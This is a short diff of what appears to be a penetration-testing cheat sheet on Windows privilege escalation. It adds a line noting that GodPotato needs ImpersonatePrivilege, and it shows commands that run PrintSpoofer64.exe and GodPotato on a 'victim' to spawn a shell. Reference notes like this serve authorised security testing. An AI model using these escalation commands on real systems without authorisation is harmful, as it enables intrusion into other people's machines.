@@ -237,6 +237,7 @@ victim: .\PrintSpoofer64.exe -i -c powershell.exe(cmd.exe)\
 whoami
 ```
 ##### Godpotato
+ImpersonatePrivilege permission required
 ```
 GodPotato-NET4.exe
 GodPotato -cmd "cmd /c whoami"
